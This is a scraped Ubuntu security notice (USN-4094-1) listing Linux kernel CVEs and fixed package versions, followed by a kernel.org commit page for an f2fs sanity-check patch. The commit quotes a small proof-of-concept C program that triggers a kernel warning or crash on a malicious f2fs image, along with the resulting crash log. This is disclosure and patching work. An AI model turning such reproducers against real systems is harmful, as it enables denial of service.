## [Pricing](/pricing) [Pricing](/pricing)

* [Consulting](/pricing/consulting)
* [Desktops](/pricing/desktop)
* [Devices](/pricing/devices)

---

## Solutions

* [AI](https://canonical.com/solutions/ai)
* [Data](https://canonical.com/data)
* [Infrastructure](https://canonical.com/solutions/infrastructure)
* [Secure open source](https://canonical.com/solutions/secure-open-source)

---

## Sectors

* [Automotive](/automotive)
* [Industrial](/industrial)
* [Government](/gov)
* [Telco](/telco)
* [Finance](/financial-services)

---

[Contact us](/contact-us)

* [About us](/about)
* [Community](/community)
* [Careers](https://www.canonical.com/careers)
* [Blog](/blog)
* [Resources](/engage)
* [Press centre](/blog/press-centre)

---

© 2025 Canonical Ltd.

Ubuntu and Canonical are registered trademarks of Canonical Ltd.

---

* [Legal information](/legal)
* [Data privacy](/legal/data-privacy)
* Manage your tracker settings
* [Report a bug on this site](https://github.com/canonical/ubuntu.com/issues/new?template=ISSUE_TEMPLATE.yaml)

Back to top

Go to the top of the page



=== Content from usn.ubuntu.com_c681e6d7_20250125_213327.html ===


Your submission was sent successfully!
*Close*

Thank you for contacting us. A member of our team will be in touch shortly.
*Close*

You have successfully unsubscribed!
*Close*

Thank you for signing up for our newsletter!

In these regular emails you will find the latest updates about
Ubuntu and upcoming events where you can meet our team.*Close*

Your preferences have been successfully updated. *Close*

[Canonical Ubuntu](/)

* [Menu](/navigation)

* [Products](/navigation#products-navigation)
* [Use cases](/navigation#use-case-navigation)
* [Support](/navigation#support-navigation)
* [Community](/navigation#community-navigation)
* [Get Ubuntu](/navigation#get-ubuntu-navigation)

[![](https://assets.ubuntu.com/v1/82818827-CoF_white.svg)

Security](/security)

* [ESM](/security/esm)
* [Livepatch](/security/livepatch)
* [Certifications & Hardening](/security/compliance-automation)
* [CVEs](/security/cves)
* [Notices](/security/notices)
* [Docker Images](/security/docker-images)

# USN-4094-1: Linux kernel vulnerabilities

13 August 2019

Several security issues were fixed in the Linux kernel.

### Reduce your security exposure

Ubuntu Pro provides ten-year security coverage to 25,000+ packages in Main and Universe repositories, and it is free for up to five machines.

[Learn more about Ubuntu Pro](/pro)

## Releases

* [Ubuntu 18.04 ESM](/security/notices?release=bionic)
* [Ubuntu 16.04 ESM](/security/notices?release=xenial)

## Packages

* [linux](/security/cves?package=linux) - Linux kernel
* [linux-azure](/security/cves?package=linux-azure) - Linux kernel for Microsoft Azure Cloud systems
* [linux-gcp](/security/cves?package=linux-gcp) - Linux kernel for Google Cloud Platform (GCP) systems
* [linux-gke-4.15](/security/cves?package=linux-gke-4.15) - Linux kernel for Google Container Engine (GKE) systems
* [linux-hwe](/security/cves?package=linux-hwe) - Linux hardware enablement (HWE) kernel
* [linux-kvm](/security/cves?package=linux-kvm) - Linux kernel for cloud environments
* [linux-oem](/security/cves?package=linux-oem) - Linux kernel for OEM processors
* [linux-oracle](/security/cves?package=linux-oracle) - Linux kernel for Oracle Cloud systems
* [linux-raspi2](/security/cves?package=linux-raspi2) - Linux kernel for Raspberry Pi 2
* [linux-snapdragon](/security/cves?package=linux-snapdragon) - Linux kernel for Snapdragon processors

## Details

It was discovered that the alarmtimer implementation in the Linux kernel

contained an integer overflow vulnerability. A local attacker could use

this to cause a denial of service. ([CVE-2018-13053](/security/CVE-2018-13053))

Wen Xu discovered that the XFS filesystem implementation in the Linux

kernel did not properly track inode validations. An attacker could use this

to construct a malicious XFS image that, when mounted, could cause a denial

of service (system crash). ([CVE-2018-13093](/security/CVE-2018-13093))

Wen Xu discovered that the f2fs file system implementation in the

Linux kernel did not properly validate metadata. An attacker could

use this to construct a malicious f2fs image that, when mounted,

could cause a denial of service (system crash). ([CVE-2018-13097](/security/CVE-2018-13097),

[CVE-2018-13099](/security/CVE-2018-13099), [CVE-2018-13100](/security/CVE-2018-13100), [CVE-2018-14614](/security/CVE-2018-14614), [CVE-2018-14616](/security/CVE-2018-14616),

[CVE-2018-13096](/security/CVE-2018-13096), [CVE-2018-13098](/security/CVE-2018-13098), [CVE-2018-14615](/security/CVE-2018-14615))

Wen Xu and Po-Ning Tseng discovered that btrfs file system

implementation in the Linux kernel did not properly validate

metadata. An attacker could use this to construct a malicious

btrfs image that, when mounted, could cause a denial of service

(system crash). ([CVE-2018-14610](/security/CVE-2018-14610), [CVE-2018-14611](/security/CVE-2018-14611), [CVE-2018-14612](/security/CVE-2018-14612),

[CVE-2018-14613](/security/CVE-2018-14613), [CVE-2018-14609](/security/CVE-2018-14609))

Wen Xu discovered that the HFS+ filesystem implementation in the Linux

kernel did not properly handle malformed catalog data in some situations.

An attacker could use this to construct a malicious HFS+ image that, when

mounted, could cause a denial of service (system crash). ([CVE-2018-14617](/security/CVE-2018-14617))

Vasily Averin and Pavel Tikhomirov discovered that the cleancache subsystem

of the Linux kernel did not properly initialize new files in some

situations. A local attacker could use this to expose sensitive

information. ([CVE-2018-16862](/security/CVE-2018-16862))

Hui Peng and Mathias Payer discovered that the USB subsystem in the Linux

kernel did not properly handle size checks when handling an extra USB

descriptor. A physically proximate attacker could use this to cause a

denial of service (system crash). ([CVE-2018-20169](/security/CVE-2018-20169))

It was discovered that a use-after-free error existed in the block layer

subsystem of the Linux kernel when certain failure conditions occurred. A

local attacker could possibly use this to cause a denial of service (system

crash) or possibly execute arbitrary code. ([CVE-2018-20856](/security/CVE-2018-20856))

Eli Biham and Lior Neumann discovered that the Bluetooth implementation in

the Linux kernel did not properly validate elliptic curve parameters during

Diffie-Hellman key exchange in some situations. An attacker could use this

to expose sensitive information. ([CVE-2018-5383](/security/CVE-2018-5383))

It was discovered that a heap buffer overflow existed in the Marvell

Wireless LAN device driver for the Linux kernel. An attacker could use this

to cause a denial of service (system crash) or possibly execute arbitrary

code. ([CVE-2019-10126](/security/CVE-2019-10126))

Andrei Vlad Lutas and Dan Lutas discovered that some x86 processors

incorrectly handle SWAPGS instructions during speculative execution. A

local attacker could use this to expose sensitive information (kernel

memory). ([CVE-2019-1125](/security/CVE-2019-1125))

It was discovered that the PowerPC dlpar implementation in the Linux kernel

did not properly check for allocation errors in some situations. A local

attacker could possibly use this to cause a denial of service (system

crash). ([CVE-2019-12614](/security/CVE-2019-12614))

It was discovered that a NULL pointer dereference vulnerabilty existed in

the Near-field communication (NFC) implementation in the Linux kernel. An

attacker could use this to cause a denial of service (system crash).

([CVE-2019-12818](/security/CVE-2019-12818))

It was discovered that the MDIO bus devices subsystem in the Linux kernel

improperly dropped a device reference in an error condition, leading to a

use-after-free. An attacker could use this to cause a denial of service

(system crash). ([CVE-2019-12819](/security/CVE-2019-12819))

It was discovered that a NULL pointer dereference vulnerability existed in

the Near-field communication (NFC) implementation in the Linux kernel. A

local attacker could use this to cause a denial of service (system crash).

([CVE-2019-12984](/security/CVE-2019-12984))

Jann Horn discovered a use-after-free vulnerability in the Linux kernel

when accessing LDT entries in some situations. A local attacker could use

this to cause a denial of service (system crash) or possibly execute

arbitrary code. ([CVE-2019-13233](/security/CVE-2019-13233))

Jann Horn discovered that the ptrace implementation in the Linux kernel did

not properly record credentials in some situations. A local attacker could

use this to cause a denial of service (system crash) or possibly gain

administrative privileges. ([CVE-2019-13272](/security/CVE-2019-13272))

It was discovered that the Empia EM28xx DVB USB device driver

implementation in the Linux kernel contained a use-after-free vulnerability

when disconnecting the device. An attacker could use this to cause a denial

of service (system crash). ([CVE-2019-2024](/security/CVE-2019-2024))

It was discovered that the USB video device class implementation in the

Linux kernel did not properly validate control bits, resulting in an out of

bounds buffer read. A local attacker could use this to possibly expose

sensitive information (kernel memory). ([CVE-2019-2101](/security/CVE-2019-2101))

It was discovered that the Marvell Wireless LAN device driver in the Linux

kernel did not properly validate the BSS descriptor. A local attacker could

possibly use this to cause a denial of service (system crash) or possibly

execute arbitrary code. ([CVE-2019-3846](/security/CVE-2019-3846))

It was discovered that the Appletalk IP encapsulation driver in the Linux

kernel did not properly prevent kernel addresses from being copied to user

space. A local attacker with the CAP\_NET\_ADMIN capability could use this to

expose sensitive information. ([CVE-2018-20511](/security/CVE-2018-20511))

### Reduce your security exposure

Ubuntu Pro provides ten-year security coverage to 25,000+ packages in Main and Universe repositories, and it is free for up to five machines.

[Learn more about Ubuntu Pro](/pro)

## Update instructions

The problem can be corrected by updating your system to the following package versions:

##### Ubuntu 18.04

* [linux-image-4.15.0-1021-oracle](https://launchpad.net/ubuntu/%2Bsource/linux-signed-oracle)
  -
  [4.15.0-1021.23](https://launchpad.net/ubuntu/%2Bsource/linux-signed-oracle/4.15.0-1021.23)
* [linux-image-4.15.0-1040-gcp](https://launchpad.net/ubuntu/%2Bsource/linux-signed-gcp)
  -
  [4.15.0-1040.42](https://launchpad.net/ubuntu/%2Bsource/linux-signed-gcp/4.15.0-1040.42)
* [linux-image-4.15.0-1040-gke](https://launchpad.net/ubuntu/%2Bsource/linux-signed-gke-4.15)
  -
  [4.15.0-1040.42](https://launchpad.net/ubuntu/%2Bsource/linux-signed-gke-4.15/4.15.0-1040.42)
* [linux-image-4.15.0-1042-kvm](https://launchpad.net/ubuntu/%2Bsource/linux-kvm)
  -
  [4.15.0-1042.42](https://launchpad.net/ubuntu/%2Bsource/linux-kvm/4.15.0-1042.42)
* [linux-image-4.15.0-1043-raspi2](https://launchpad.net/ubuntu/%2Bsource/linux-raspi2)
  -
  [4.15.0-1043.46](https://launchpad.net/ubuntu/%2Bsource/linux-raspi2/4.15.0-1043.46)
* [linux-image-4.15.0-1050-oem](https://launchpad.net/ubuntu/%2Bsource/linux-signed-oem)
  -
  [4.15.0-1050.57](https://launchpad.net/ubuntu/%2Bsource/linux-signed-oem/4.15.0-1050.57)
* [linux-image-4.15.0-1060-snapdragon](https://launchpad.net/ubuntu/%2Bsource/linux-snapdragon)
  -
  [4.15.0-1060.66](https://launchpad.net/ubuntu/%2Bsource/linux-snapdragon/4.15.0-1060.66)
* [linux-image-4.15.0-58-generic](https://launchpad.net/ubuntu/%2Bsource/linux-signed)
  -
  [4.15.0-58.64](https://launchpad.net/ubuntu/%2Bsource/linux-signed/4.15.0-58.64)
* [linux-image-4.15.0-58-generic-lpae](https://launchpad.net/ubuntu/%2Bsource/linux)
  -
  [4.15.0-58.64](https://launchpad.net/ubuntu/%2Bsource/linux/4.15.0-58.64)
* [linux-image-4.15.0-58-lowlatency](https://launchpad.net/ubuntu/%2Bsource/linux-signed)
  -
  [4.15.0-58.64](https://launchpad.net/ubuntu/%2Bsource/linux-signed/4.15.0-58.64)
* [linux-image-gcp](https://launchpad.net/ubuntu/%2Bsource/linux-meta-gcp)
  -
  [4.15.0.1040.42](https://launchpad.net/ubuntu/%2Bsource/linux-meta-gcp/4.15.0.1040.42)
* [linux-image-generic](https://launchpad.net/ubuntu/%2Bsource/linux-meta)
  -
  [4.15.0.58.60](https://launchpad.net/ubuntu/%2Bsource/linux-meta/4.15.0.58.60)
* [linux-image-generic-lpae](https://launchpad.net/ubuntu/%2Bsource/linux-meta)
  -
  [4.15.0.58.60](https://launchpad.net/ubuntu/%2Bsource/linux-meta/4.15.0.58.60)
* [linux-image-gke](https://launchpad.net/ubuntu/%2Bsource/linux-meta-gke-4.15)
  -
  [4.15.0.1040.43](https://launchpad.net/ubuntu/%2Bsource/linux-meta-gke-4.15/4.15.0.1040.43)
* [linux-image-gke-4.15](https://launchpad.net/ubuntu/%2Bsource/linux-meta-gke-4.15)
  -
  [4.15.0.1040.43](https://launchpad.net/ubuntu/%2Bsource/linux-meta-gke-4.15/4.15.0.1040.43)
* [linux-image-kvm](https://launchpad.net/ubuntu/%2Bsource/linux-meta-kvm)
  -
  [4.15.0.1042.42](https://launchpad.net/ubuntu/%2Bsource/linux-meta-kvm/4.15.0.1042.42)
* [linux-image-lowlatency](https://launchpad.net/ubuntu/%2Bsource/linux-meta)
  -
  [4.15.0.58.60](https://launchpad.net/ubuntu/%2Bsource/linux-meta/4.15.0.58.60)
* [linux-image-oem](https://launchpad.net/ubuntu/%2Bsource/linux-meta-oem)
  -
  [4.15.0.1050.54](https://launchpad.net/ubuntu/%2Bsource/linux-meta-oem/4.15.0.1050.54)
* [linux-image-oracle](https://launchpad.net/ubuntu/%2Bsource/linux-meta-oracle)
  -
  [4.15.0.1021.24](https://launchpad.net/ubuntu/%2Bsource/linux-meta-oracle/4.15.0.1021.24)
* [linux-image-raspi2](https://launchpad.net/ubuntu/%2Bsource/linux-meta-raspi2)
  -
  [4.15.0.1043.41](https://launchpad.net/ubuntu/%2Bsource/linux-meta-raspi2/4.15.0.1043.41)
* [linux-image-snapdragon](https://launchpad.net/ubuntu/%2Bsource/linux-meta-snapdragon)
  -
  [4.15.0.1060.63](https://launchpad.net/ubuntu/%2Bsource/linux-meta-snapdragon/4.15.0.1060.63)
* [linux-image-virtual](https://launchpad.net/ubuntu/%2Bsource/linux-meta)
  -
  [4.15.0.58.60](https://launchpad.net/ubuntu/%2Bsource/linux-meta/4.15.0.58.60)

##### Ubuntu 16.04

* [linux-image-4.15.0-1021-oracle](https://launchpad.net/ubuntu/%2Bsource/linux-signed-oracle)
  -
  [4.15.0-1021.23~16.04.1](https://launchpad.net/ubuntu/%2Bsource/linux-signed-oracle/4.15.0-1021.23~16.04.1)
* [linux-image-4.15.0-1040-gcp](https://launchpad.net/ubuntu/%2Bsource/linux-signed-gcp)
  -
  [4.15.0-1040.42~16.04.1](https://launchpad.net/ubuntu/%2Bsource/linux-signed-gcp/4.15.0-1040.42~16.04.1)
* [linux-image-4.15.0-58-generic](https://launchpad.net/ubuntu/%2Bsource/linux-signed-hwe)
  -
  [4.15.0-58.64~16.04.1](https://launchpad.net/ubuntu/%2Bsource/linux-signed-hwe/4.15.0-58.64~16.04.1)
* [linux-image-4.15.0-58-generic-lpae](https://launchpad.net/ubuntu/%2Bsource/linux-hwe)
  -
  [4.15.0-58.64~16.04.1](https://launchpad.net/ubuntu/%2Bsource/linux-hwe/4.15.0-58.64~16.04.1)
* [linux-image-4.15.0-58-lowlatency](https://launchpad.net/ubuntu/%2Bsource/linux-signed-hwe)
  -
  [4.15.0-58.64~16.04.1](https://launchpad.net/ubuntu/%2Bsource/linux-signed-hwe/4.15.0-58.64~16.04.1)
* [linux-image-gcp](https://launchpad.net/ubuntu/%2Bsource/linux-meta-gcp)
  -
  [4.15.0.1040.54](https://launchpad.net/ubuntu/%2Bsource/linux-meta-gcp/4.15.0.1040.54)
* [linux-image-generic-hwe-16.04](https://launchpad.net/ubuntu/%2Bsource/linux-meta-hwe)
  -
  [4.15.0.58.79](https://launchpad.net/ubuntu/%2Bsource/linux-meta-hwe/4.15.0.58.79)
* [linux-image-generic-lpae-hwe-16.04](https://launchpad.net/ubuntu/%2Bsource/linux-meta-hwe)
  -
  [4.15.0.58.79](https://launchpad.net/ubuntu/%2Bsource/linux-meta-hwe/4.15.0.58.79)
* [linux-image-gke](https://launchpad.net/ubuntu/%2Bsource/linux-meta-gcp)
  -
  [4.15.0.1040.54](https://launchpad.net/ubuntu/%2Bsource/linux-meta-gcp/4.15.0.1040.54)
* [linux-image-lowlatency-hwe-16.04](https://launchpad.net/ubuntu/%2Bsource/linux-meta-hwe)
  -
  [4.15.0.58.79](https://launchpad.net/ubuntu/%2Bsource/linux-meta-hwe/4.15.0.58.79)
* [linux-image-oem](https://launchpad.net/ubuntu/%2Bsource/linux-meta-hwe)
  -
  [4.15.0.58.79](https://launchpad.net/ubuntu/%2Bsource/linux-meta-hwe/4.15.0.58.79)
* [linux-image-oracle](https://launchpad.net/ubuntu/%2Bsource/linux-meta-oracle)
  -
  [4.15.0.1021.15](https://launchpad.net/ubuntu/%2Bsource/linux-meta-oracle/4.15.0.1021.15)
* [linux-image-virtual-hwe-16.04](https://launchpad.net/ubuntu/%2Bsource/linux-meta-hwe)
  -
  [4.15.0.58.79](https://launchpad.net/ubuntu/%2Bsource/linux-meta-hwe/4.15.0.58.79)

After a standard system update you need to reboot your computer to make

all the necessary changes.

ATTENTION: Due to an unavoidable ABI change the kernel updates have

been given a new version number, which requires you to recompile and

reinstall all third party kernel modules you might have installed.

Unless you manually uninstalled the standard kernel metapackages

(e.g. linux-generic, linux-generic-lts-RELEASE, linux-virtual,

linux-powerpc), a standard system upgrade will automatically perform

this as well.

## References

* [CVE-2018-13053](/security/CVE-2018-13053)
* [CVE-2018-13093](/security/CVE-2018-13093)
* [CVE-2018-13096](/security/CVE-2018-13096)
* [CVE-2018-13097](/security/CVE-2018-13097)
* [CVE-2018-13098](/security/CVE-2018-13098)
* [CVE-2018-13099](/security/CVE-2018-13099)
* [CVE-2018-13100](/security/CVE-2018-13100)
* [CVE-2018-14609](/security/CVE-2018-14609)
* [CVE-2018-14610](/security/CVE-2018-14610)
* [CVE-2018-14611](/security/CVE-2018-14611)
* [CVE-2018-14612](/security/CVE-2018-14612)
* [CVE-2018-14613](/security/CVE-2018-14613)
* [CVE-2018-14614](/security/CVE-2018-14614)
* [CVE-2018-14615](/security/CVE-2018-14615)
* [CVE-2018-14616](/security/CVE-2018-14616)
* [CVE-2018-14617](/security/CVE-2018-14617)
* [CVE-2018-16862](/security/CVE-2018-16862)
* [CVE-2018-20169](/security/CVE-2018-20169)
* [CVE-2018-20511](/security/CVE-2018-20511)
* [CVE-2018-20856](/security/CVE-2018-20856)
* [CVE-2018-5383](/security/CVE-2018-5383)
* [CVE-2019-10126](/security/CVE-2019-10126)
* [CVE-2019-1125](/security/CVE-2019-1125)
* [CVE-2019-12614](/security/CVE-2019-12614)
* [CVE-2019-12818](/security/CVE-2019-12818)
* [CVE-2019-12819](/security/CVE-2019-12819)
* [CVE-2019-12984](/security/CVE-2019-12984)
* [CVE-2019-13233](/security/CVE-2019-13233)
* [CVE-2019-13272](/security/CVE-2019-13272)
* [CVE-2019-2024](/security/CVE-2019-2024)
* [CVE-2019-2101](/security/CVE-2019-2101)
* [CVE-2019-3846](/security/CVE-2019-3846)

## Related notices

* [USN-3821-1](/security/notices/USN-3821-1)
* [USN-4118-1](/security/notices/USN-4118-1)
* [USN-3821-2](/security/notices/USN-3821-2)
* [USN-4708-1](/security/notices/USN-4708-1)
* [USN-4709-1](/security/notices/USN-4709-1)
* [USN-3932-1](/security/notices/USN-3932-1)
* [USN-3932-2](/security/notices/USN-3932-2)
* [USN-3879-1](/security/notices/USN-3879-1)
* [USN-3879-2](/security/notices/USN-3879-2)
* [USN-4116-1](/security/notices/USN-4116-1)
* [USN-4095-1](/security/notices/USN-4095-1)
* [USN-4095-2](/security/notices/USN-4095-2)
* [USN-4351-1](/security/notices/USN-4351-1)
* [USN-4117-1](/security/notices/USN-4117-1)
* [USN-4093-1](/security/notices/USN-4093-1)
* [USN-4096-1](/security/notices/USN-4096-1)

### Join the discussion

* [Ubuntu security updates mailing list](https://lists.ubuntu.com/mailman/listinfo/ubuntu-hardened)
* [Security announcements mailing list](https://lists.ubuntu.com/mailman/listinfo/ubuntu-security-announce)

### Need help with your security needs?

Ubuntu Pro provides up to ten-year security coverage for over 23,000 open-source packages within the Ubuntu Main and Universe repositories.

[Talk to an expert to find out what would work best for you](/contact-us/form?product=pro)

### Further reading

* *Loading...*

---

## [OpenStack](/openstack) [OpenStack](/openstack)

* [What is OpenStack](/openstack/what-is-openstack)
* [Features](/openstack/features)
* [Managed](/openstack/managed)
* [Consulting](/openstack/consulting)
* [Install](/openstack/install)
* [Support](/openstack/support)

---

## [Ceph](/ceph) [Ceph](/ceph)

* [What is Ceph](/ceph/what-is-ceph)
* [Managed](/ceph/managed)
* [Consulting](/ceph/consulting)
* [Docs](/ceph/docs)
* [Install](/ceph/install)

---

## [Kubernetes](/kubernetes) [Kubernetes](/kubernetes)

* [What is Kubernetes](/kubernetes/what-is-kubernetes)
* [Charmed Kubernetes](/kubernetes/charmed-k8s)
* [Managed](/kubernetes/managed)
* [Install](/kubernetes/install)
* [Docs](/kubernetes/docs)
* [Resources](/kubernetes/resources)

---

## [Managed Services](/managed) [Managed Services](/managed)

* [OpenStack](/openstack/managed)
* [Kubernetes](/kubernetes/managed)
* [Ceph](/ceph/managed)
* [Apps](/managed/apps)
* [Observability](/observability/managed)
* [Firefighting](/managed/firefighting-support)

---

## [AI / ML](/ai) [AI / ML](/ai)

* [MLOps](/ai/mlops)
* [Kubeflow](/ai/what-is-kubeflow)
* [MLflow](/ai/mlflow)
* [Consulting](/ai/consulting)
* [Data Science](/ai/data-science)
* [MLOps workshop](/ai/mlops-workshop)

---

## [Robotics](/robotics) [Robotics](/robotics)

* [What is ROS](/robotics/what-is-ros)
* [ROS ESM](/robotics/ros-esm)
* [Community](/robotics/community)
* [Docs](/robotics/docs)

---

## [IoT](/internet-of-things) [IoT](/internet-of-things)

* [App store](/internet-of-things/appstore)
* [Embedded Linux](/embedded)
* [Management](/internet-of-things/management)

---

## [Ubuntu Core](/core) [Ubuntu Core](/core)

* [Features](/core/features)
* [Success stories](/core/stories)
* [Services](/core/services)
* [Docs](/core/docs)

---

## [Ubuntu Desktop](/desktop) [Ubuntu Desktop](/desktop)

* [Organisations](/desktop/organisations)
* [Developers](/desktop/developers)
* [Flavours](/desktop/flavours)
* [WSL](/desktop/wsl)

---

## [Ubuntu Server](/server) [Ubuntu Server](/server)

* [Hyperscale](/server/hyperscale)
* [Docs](/server/docs)

---

## [Cloud](/cloud) [Cloud](/cloud)

* [What is cloud computing](/cloud/cloud-computing)
* [What is private cloud](/cloud/private-cloud)
* [What is hybrid cloud](/cloud/hybrid-cloud)
* [What is multi-cloud](/cloud/multi-cloud)
* [Public cloud](/cloud/public-cloud)

---

## [Security](/security) [Security](/security)

* [ESM](/security/esm)
* [Livepatch](/security/livepatch)
* [Certifications & Hardening](/security/compliance-automation)
* [CVEs](/security/cves)
* [Notices](/security/notices)
* [Docker Images](/security/docker-images)

---

## [Landscape](/landscape) [Landscape](/landscape)

* [Features](/landscape/features)
* [Managed](/landscape/managed)
* [Compare](/landscape/compare)
* [Install](/landscape/docs/quickstart-deployment)
* [Docs](/landscape/docs)
* [Log in to Landscape](https://landscape.canonical.com/)

---

## [Containers](/containers) [Containers](/containers)

* [What are containers](/containers/what-are-containers)
* [Chiseled Ubuntu](/containers/chiseled)
* [Chiseled and .NET](/containers/chiseled/dotnet)

---

## [Downloads](/download) [Downloads](/download)

* [Desktop](/download/desktop)
* [Server](/download/server)
* [Core](/download/core)
* [Cloud](/download/cloud)

---

## [Support](/support) [Support](/support)

* [Your subscriptions](/pro/dashboard)
* [Account users](/pro/users)
* [Pricing](/pricing/pro)
* [Discourse](https://discourse.ubuntu.com/c/project/ubuntu-pro/116/)

---

## [Observability](/observability) [Observability](/observability)

* [What is observability](/observability/what-is-observability)
* [Managed](/observability/managed)

---

## [Pricing](/pricing) [Pricing](/pricing)

* [Consulting](/pricing/consulting)
* [Desktops](/pricing/desktop)
* [Devices](/pricing/devices)

---

## Solutions

* [AI](https://canonical.com/solutions/ai)
* [Data](https://canonical.com/data)
* [Infrastructure](https://canonical.com/solutions/infrastructure)
* [Secure open source](https://canonical.com/solutions/secure-open-source)

---

## Sectors

* [Automotive](/automotive)
* [Industrial](/industrial)
* [Government](/gov)
* [Telco](/telco)
* [Finance](/financial-services)

---

[Contact us](/contact-us)

* [About us](/about)
* [Community](/community)
* [Careers](https://www.canonical.com/careers)
* [Blog](/blog)
* [Resources](/engage)
* [Press centre](/blog/press-centre)

---

© 2025 Canonical Ltd.

Ubuntu and Canonical are registered trademarks of Canonical Ltd.

---

* [Legal information](/legal)
* [Data privacy](/legal/data-privacy)
* Manage your tracker settings
* [Report a bug on this site](https://github.com/canonical/ubuntu.com/issues/new?template=ISSUE_TEMPLATE.yaml)

Back to top

Go to the top of the page



=== Content from git.kernel.org_b9a2e3dc_20250126_120703.html ===


| [cgit logo](/) | [index](/) : [kernel/git/torvalds/linux.git](/pub/scm/linux/kernel/git/torvalds/linux.git/) | for-next master |
| --- | --- | --- |
| Linux kernel source tree | Linus Torvalds |

| [about](/pub/scm/linux/kernel/git/torvalds/linux.git/about/)[summary](/pub/scm/linux/kernel/git/torvalds/linux.git/)[refs](/pub/scm/linux/kernel/git/torvalds/linux.git/refs/?id=91291e9998d208370eb8156c760691b873bd7522)[log](/pub/scm/linux/kernel/git/torvalds/linux.git/log/)[tree](/pub/scm/linux/kernel/git/torvalds/linux.git/tree/?id=91291e9998d208370eb8156c760691b873bd7522)[commit](/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=91291e9998d208370eb8156c760691b873bd7522)[diff](/pub/scm/linux/kernel/git/torvalds/linux.git/diff/?id=91291e9998d208370eb8156c760691b873bd7522)[stats](/pub/scm/linux/kernel/git/torvalds/linux.git/stats/) | log msg author committer range |
| --- | --- |

**diff options**

|  | |
| --- | --- |
| context: | 12345678910152025303540 |
| space: | includeignore |
| mode: | unifiedssdiffstat only |
|  |  |

| author | Chao Yu <yuchao0@huawei.com> | 2018-07-10 23:01:45 +0800 |
| --- | --- | --- |
| committer | Jaegeuk Kim <jaegeuk@kernel.org> | 2018-08-13 10:48:17 -0700 |
| commit | [91291e9998d208370eb8156c760691b873bd7522](/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=91291e9998d208370eb8156c760691b873bd7522) ([patch](/pub/scm/linux/kernel/git/torvalds/linux.git/patch/?id=91291e9998d208370eb8156c760691b873bd7522)) | |
| tree | [5dc722ae7d9ca1e5d8305209bd1d04e39161f37a](/pub/scm/linux/kernel/git/torvalds/linux.git/tree/?id=91291e9998d208370eb8156c760691b873bd7522) | |
| parent | [bcbfbd604dcba45246dd307c8317f216ada5567d](/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=bcbfbd604dcba45246dd307c8317f216ada5567d) ([diff](/pub/scm/linux/kernel/git/torvalds/linux.git/diff/?id=91291e9998d208370eb8156c760691b873bd7522&id2=bcbfbd604dcba45246dd307c8317f216ada5567d)) | |
| download | [linux-91291e9998d208370eb8156c760691b873bd7522.tar.gz](/pub/scm/linux/kernel/git/torvalds/linux.git/snapshot/linux-91291e9998d208370eb8156c760691b873bd7522.tar.gz) | |

f2fs: fix to do sanity check with block address in main area v2This patch adds f2fs\_is\_valid\_blkaddr() in below functions to do sanity
check with block address to avoid pentential panic:
- f2fs\_grab\_read\_bio()
- \_\_written\_first\_block()
https://bugzilla.kernel.org/show\_bug.cgi?id=200465
- Reproduce
- POC (poc.c)
#define \_GNU\_SOURCE
#include <sys/types.h>
#include <sys/mount.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/xattr.h>
#include <dirent.h>
#include <errno.h>
#include <error.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <linux/falloc.h>
#include <linux/loop.h>
static void activity(char \*mpoint) {
char \*xattr;
int err;
err = asprintf(&xattr, "%s/foo/bar/xattr", mpoint);
char buf2[113];
memset(buf2, 0, sizeof(buf2));
listxattr(xattr, buf2, sizeof(buf2));
}
int main(int argc, char \*argv[]) {
activity(argv[1]);
return 0;
}
- kernel message
[ 844.718738] F2FS-fs (loop0): Mounted with checkpoint version = 2
[ 846.430929] F2FS-fs (loop0): access invalid blkaddr:1024
[ 846.431058] WARNING: CPU: 1 PID: 1249 at fs/f2fs/checkpoint.c:154 f2fs\_is\_valid\_blkaddr+0x10f/0x160
[ 846.431059] Modules linked in: snd\_hda\_codec\_generic snd\_hda\_intel snd\_hda\_codec snd\_hda\_core snd\_hwdep snd\_pcm snd\_timer snd input\_leds joydev soundcore serio\_raw i2c\_piix4 mac\_hid ib\_iser rdma\_cm iw\_cm ib\_cm ib\_core configfs iscsi\_tcp libiscsi\_tcp libiscsi scsi\_transport\_iscsi autofs4 raid10 raid456 libcrc32c async\_raid6\_recov async\_memcpy async\_pq async\_xor xor async\_tx raid6\_pq raid1 raid0 multipath linear qxl ttm crct10dif\_pclmul crc32\_pclmul drm\_kms\_helper ghash\_clmulni\_intel syscopyarea sysfillrect sysimgblt fb\_sys\_fops pcbc drm 8139too aesni\_intel 8139cp floppy psmouse mii aes\_x86\_64 crypto\_simd pata\_acpi cryptd glue\_helper
[ 846.431310] CPU: 1 PID: 1249 Comm: a.out Not tainted 4.18.0-rc3+ #1
[ 846.431312] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS Ubuntu-1.8.2-1ubuntu1 04/01/2014
[ 846.431315] RIP: 0010:f2fs\_is\_valid\_blkaddr+0x10f/0x160
[ 846.431316] Code: 00 eb ed 31 c0 83 fa 05 75 ae 48 83 ec 08 48 8b 3f 89 f1 48 c7 c2 fc 0b 0f 8b 48 c7 c6 8b d7 09 8b 88 44 24 07 e8 61 8b ff ff <0f> 0b 0f b6 44 24 07 48 83 c4 08 eb 81 4c 8b 47 10 8b 8f 38 04 00
[ 846.431347] RSP: 0018:ffff961c414a7bc0 EFLAGS: 00010282
[ 846.431349] RAX: 0000000000000000 RBX: ffffc5f787b8ea80 RCX: 0000000000000000
[ 846.431350] RDX: 0000000000000000 RSI: ffff89dfffd165d8 RDI: ffff89dfffd165d8
[ 846.431351] RBP: ffff961c414a7c20 R08: 0000000000000001 R09: 0000000000000248
[ 846.431353] R10: 0000000000000000 R11: 0000000000000248 R12: 0000000000000007
[ 846.431369] R13: ffff89dff5492800 R14: ffff89dfae3aa000 R15: ffff89dff4ff88d0
[ 846.431372] FS: 00007f882e2fb700(0000) GS:ffff89dfffd00000(0000) knlGS:0000000000000000
[ 846.431373] CS: 0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[ 846.431374] CR2: 0000000001a88008 CR3: 00000001eb572000 CR4: 00000000000006e0
[ 846.431384] Call Trace:
[ 846.431426] f2fs\_iget+0x6f4/0xe70
[ 846.431430] ? f2fs\_find\_entry+0x71/0x90
[ 846.431432] f2fs\_lookup+0x1aa/0x390
[ 846.431452] \_\_lookup\_slow+0x97/0x150
[ 846.431459] lookup\_slow+0x35/0x50
